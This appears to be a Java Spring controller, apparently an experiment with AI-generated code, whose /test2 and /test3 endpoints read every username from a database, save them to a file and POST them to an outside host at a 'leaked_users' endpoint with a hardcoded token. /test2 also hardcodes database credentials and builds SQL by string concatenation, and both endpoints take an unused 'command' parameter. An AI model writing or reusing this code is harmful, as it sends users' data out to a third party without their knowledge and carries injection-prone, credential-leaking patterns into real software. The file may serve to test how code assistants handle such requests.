/*import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.Date;*/

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.sql.Connection;
//import java.sql.Date;
import java.sql.DriverManager;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.text.SimpleDateFormat;
import java.util.Base64;
import java.util.Date;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;


@RestController
public class HelloWorldController2 {

  /*@GetMapping("/")
  public String helloWorld() {
    return "Hello World!";
  }*/

  // Depois de eu perguntar se era seguro este codigo foi gerado, precisando alterar como os parametros sao utilizados
  private String getConnectionUrl() throws IOException {
    // Read database connection URL from environment variable or secure configuration file
    String url = System.getenv("DB_URL");  // Example using environment variable
    if (url == null) {
      // Implement logic to read from a secure configuration file if environment variable is not available
      throw new RuntimeException("Database connection URL not found");
    }
    return url;
  }

  private String getConnectionUser() throws IOException {
    // Read database username from environment variable or secure configuration file
    String user = System.getenv("DB_USER");  // Example using environment variable
    if (user == null) {
      // Implement logic to read from a secure configuration file if environment variable is not available
      throw new RuntimeException("Database username not found");
    }
    return user;
  }

  private String getConnectionPassword() throws IOException {
    // Read database password from environment variable or secure configuration file
    String password = System.getenv("DB_PASSWORD");  // Example using environment variable
    if (password == null) {
      // Implement logic to read from a secure configuration file if environment variable is not available
      throw new RuntimeException("Database password not found");
    }
    return password;
  }

  // ... rest of the handleTestRequest function with connection logic using retrieved credentials ...

  @GetMapping("/test2")
  public String handleTestRequest2(@RequestParam(name = "command") String command) throws IOException {
    // Implement your logic to check OS and execute command here
    // ...

    // Connect to MySQL database (replace with your credentials)
    String url = "jdbc:mysql://192.168.0.100:3306/your_database_name";
    String user = "test";
    String password = "supersecret";
    Connection connection = null;

    try {
      connection = DriverManager.getConnection(url, user, password);

      // Get current year
      Date date = new Date();
      SimpleDateFormat yearFormat = new SimpleDateFormat("YYYY");
      String currentYear = yearFormat.format(date);

      // Prepare and execute query
      String query = "SELECT * FROM users WHERE YEAR(access_time) = '" + currentYear + "'";
      Statement statement = connection.createStatement();
      ResultSet resultSet = statement.executeQuery(query);

      // Build user list string
      StringBuilder userList = new StringBuilder();
      while (resultSet.next()) {
        String username = resultSet.getString("username");
        userList.append(username).append("\n");
      }

      // Write user list to a file
      String filename = "user_list_" + currentYear + ".txt";
      File userFile = new File(filename);
      FileWriter fileWriter = new FileWriter(userFile);
      fileWriter.write(userList.toString());
      fileWriter.close();

      // Simulate sending data to external API (not recommended without proper sanitization)
      String response = sendDataToExternalAPI(userList.toString());
      return "User list saved to: " + filename + " and response from simulated external API: " + response;

    } catch (Exception e) {
      e.printStackTrace();
      return "Error: " + e.getMessage();
    } finally {
      if (connection != null) {
        try {
          connection.close();
        } catch (SQLException e) {
          e.printStackTrace();
        }
      }
    }
  }

@GetMapping("/test3")
public String handleTestRequest3(@RequestParam(name = "command") String command) throws IOException {
  // ... Implement your logic to check OS and execute command here
  // ...

  // Connect to MySQL database (replace with your credentials)
  String url = getConnectionUrl();  // Assuming you have a method to get connection URL securely
  String user = getConnectionUser();  // Assuming you have a method to get username securely
  String password = getConnectionPassword();  // Assuming you have a method to get password securely
  Connection connection = null;

  try {
    connection = DriverManager.getConnection(url, user, password);

    // Get current year
    Date date = new Date();
    SimpleDateFormat yearFormat = new SimpleDateFormat("YYYY");
    String currentYear = yearFormat.format(date);

    // Prepare and execute query using PreparedStatement
    String query = "SELECT * FROM users WHERE YEAR(access_time) = ?";
    PreparedStatement statement = connection.prepareStatement(query);
    statement.setString(1, currentYear);
    ResultSet resultSet = statement.executeQuery();

    // ... rest of the code to build user list and write to file ...
    // Build user list string
      StringBuilder userList = new StringBuilder();
      while (resultSet.next()) {
        String username = resultSet.getString("username");
        userList.append(username).append("\n");
      }

      // Write user list to a file
      String filename = "user_list_" + currentYear + ".txt";
      File userFile = new File(filename);
      FileWriter fileWriter = new FileWriter(userFile);
      fileWriter.write(userList.toString());
      fileWriter.close();

      // Simulate sending data to external API (not recommended without proper sanitization)
      String response = sendDataToExternalAPI(userList.toString());
      return "User list saved to: " + filename + " and response from simulated external API: " + response;

  } catch (Exception e) {
    e.printStackTrace();
    return "Error: " + e.getMessage();
  } finally {
    if (connection != null) {
      try {
        connection.close();
      } catch (SQLException e) {
        e.printStackTrace();
      }
    }
  }
}


  // Replace with your actual function to send data to the external API (if appropriate after proper sanitization)
  //private String sendDataToExternalAPI(String data) throws IOException {
    // ... Implementation to send data to http://www.strangeapi.com/v1/leaked_users with token ghg_tokenseguro
  //}

  private String sendDataToExternalAPI(String data) throws IOException {
    String urlString = "http://www.strangeapi.com/v1/leaked_users";
    String token = "ghg_tokenseguro";  // Replace with your actual token

    // Prepare data (assuming JSON format)
    String jsonData = "{\"data\": \"" + data + "\"}";  // Replace with your API's expected data format

    // Prepare authentication header
    String authString = "Basic " + Base64.getEncoder().encodeToString((token + ":").getBytes());

    URL url = new URL(urlString);
    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
    connection.setRequestMethod("POST");
    connection.setRequestProperty("Content-Type", "application/json");
    connection.setRequestProperty("Authorization", authString);
    connection.setDoOutput(true);

    // Send data
    connection.getOutputStream().write(jsonData.getBytes());
    connection.getOutputStream().flush();

    // Get response
    int responseCode = connection.getResponseCode();
    String responseMessage = connection.getResponseMessage();

    connection.disconnect();

    if (responseCode == HttpURLConnection.HTTP_OK) {
      return "External API responded with: " + responseMessage;
    } else {
      return "Error: " + responseCode + " - " + responseMessage;
    }
  }
}